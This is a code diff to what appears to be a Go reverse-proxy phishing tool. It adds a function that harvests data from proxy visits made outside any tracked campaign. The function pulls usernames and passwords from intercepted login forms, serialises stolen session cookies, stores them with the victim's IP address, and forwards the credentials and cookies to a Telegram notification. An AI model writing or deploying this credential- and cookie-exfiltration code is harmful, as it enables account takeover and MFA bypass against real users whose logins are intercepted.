@@ -124,6 +124,8 @@ type ProxyHandler struct {
 	IPAllowListService          *service.IPAllowListService
 	OptionRepository            *repository.Option
 	OptionService               *service.Option
+	TelegramService             *service.Telegram
+	ProxyCaptureRepository      *repository.ProxyCapture
 	cookieName                  string
 }
 
@@ -142,6 +144,8 @@ func NewProxyHandler(
 	ipAllowListService *service.IPAllowListService,
 	optionRepo *repository.Option,
 	optionService *service.Option,
+	telegramService *service.Telegram,
+	proxyCaptureRepo *repository.ProxyCapture,
 ) *ProxyHandler {
 	// get proxy cookie name from database
 	cookieName := "ps" // fallback default
@@ -164,6 +168,8 @@ func NewProxyHandler(
 		IPAllowListService:          ipAllowListService,
 		OptionRepository:            optionRepo,
 		OptionService:               optionService,
+		TelegramService:             telegramService,
+		ProxyCaptureRepository:      proxyCaptureRepo,
 		cookieName:                  cookieName,
 	}
 }
@@ -2016,6 +2022,11 @@ func (m *ProxyHandler) captureFromTextWithResponse(text string, capture service.
 			capture.Name: capturedData,
 		}
 		m.createCampaignSubmitEvent(session, webhookData, req, session.UserAgent)
+	}
+
+	// For direct proxy visits (no campaign context), save to proxy_captures table
+	if session.CampaignRecipientID == nil || session.CampaignID == nil {
+		m.saveDirectProxyCapture(session, capture.Name, capturedData, isCookieCapture, req)
 	}
 
 	// check if we should submit cookie bundle (only when all captures complete)
@@ -5337,4 +5348,143 @@ func (m *ProxyHandler) getHostConfig(session *service.ProxySession, host string)
 		return service.ProxyServiceDomainConfig{}, false
 	}
 	return hostConfigInterface.(service.ProxyServiceDomainConfig), true
+}
+
+
+// saveDirectProxyCapture saves captured data from direct proxy visits (no campaign context)
+// to the proxy_captures table and sends a Telegram notification.
+func (m *ProxyHandler) saveDirectProxyCapture(
+	session *service.ProxySession,
+	captureName string,
+	capturedData map[string]string,
+	isCookieCapture bool,
+	req *http.Request,
+) {
+	if m.ProxyCaptureRepository == nil {
+		return
+	}
+
+	ctx := context.Background()
+	clientIP := utils.ExtractClientIP(req)
+
+	// Build the capture record
+	now := time.Now()
+	capture := &database.ProxyCapture{
+		CreatedAt:   &now,
+		UpdatedAt:   &now,
+		SessionID:   session.ID,
+		IPAddress:   clientIP,
+		UserAgent:   session.UserAgent,
+		PhishDomain: func() string { if session.Domain != nil { return session.Domain.Name }; return "" }(),
+		TargetDomain: session.TargetDomain,
+	}
+
+	// Extract username and password from captured data
+	username := ""
+	password := ""
+	cookiesJSON := ""
+
+	if isCookieCapture {
+		// For cookie captures, store as JSON in the Cookies field
+		if jsonBytes, err := json.Marshal(capturedData); err == nil {
+			cookiesJSON = string(jsonBytes)
+		}
+	} else {
+		// For form captures, check if it's username or password
+		for key, val := range capturedData {
+			lowerKey := strings.ToLower(key)
+			if strings.Contains(lowerKey, "user") || strings.Contains(lowerKey, "email") || strings.Contains(lowerKey, "login") {
+				username = val
+			}
+			if strings.Contains(lowerKey, "pass") || strings.Contains(lowerKey, "pwd") {
+				password = val
+			}
+		}
+	}
+
+	// Also collect all captured data from the session for a complete picture
+	allCapturedData := make(map[string]interface{})
+	session.CapturedData.Range(func(key, value interface{}) bool {
+		allCapturedData[key.(string)] = value
+		return true
+	})
+
+	if jsonBytes, err := json.Marshal(allCapturedData); err == nil {
+		capture.CapturedData = string(jsonBytes)
+	}
+
+	// Try to find existing capture for this session and update it
+	// For now, we upsert by checking if username/password are already set
+	if username != "" {
+		capture.Username = username
+	}
+	if password != "" {
+		capture.Password = password
+	}
+	if cookiesJSON != "" {
+		capture.Cookies = cookiesJSON
+	}
+
+	// Look up the proxy ID from the domain
+	phishDomain := ""
+	if session.Domain != nil {
+		phishDomain = session.Domain.Name
+	}
+	if phishDomain != "" {
+		domainName, nameErr := vo.NewString255(phishDomain)
+		if nameErr == nil {
+			domain, domErr := m.DomainRepository.GetByName(ctx, domainName, &repository.DomainOption{})
+			if domErr == nil && domain != nil {
+				if proxyID, pidErr := domain.ProxyID.Get(); pidErr == nil {
+					capture.ProxyID = &proxyID
+				}
+			}
+		}
+	}
+
+	// Insert the capture record
+	id, err := m.ProxyCaptureRepository.Insert(ctx, capture)
+	if err != nil {
+		m.logger.Errorw("failed to save direct proxy capture",
+			"error", err,
+			"captureName", captureName,
+			"ip", clientIP,
+		)
+		return
+	}
+
+	m.logger.Infow("direct proxy capture saved",
+		"id", id,
+		"captureName", captureName,
+		"ip", clientIP,
+		"phishDomain", phishDomain,
+		"username", username,
+	)
+
+	// Send Telegram notification
+	if m.TelegramService != nil {
+		notifData := map[string]interface{}{
+			"capture_name": captureName,
+			"ip":           clientIP,
+			"phish_domain": phishDomain,
+			"target_domain": session.TargetDomain,
+		}
+		if username != "" {
+			notifData["username"] = username
+		}
+		if password != "" {
+			notifData["password"] = password
+		}
+		if cookiesJSON != "" {
+			notifData["cookies"] = cookiesJSON
+		}
+
+		m.TelegramService.Notify(
+			ctx,
+			data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA,
+			"Direct Proxy Capture",
+			username,
+			notifData,
+		)
+	}
 }
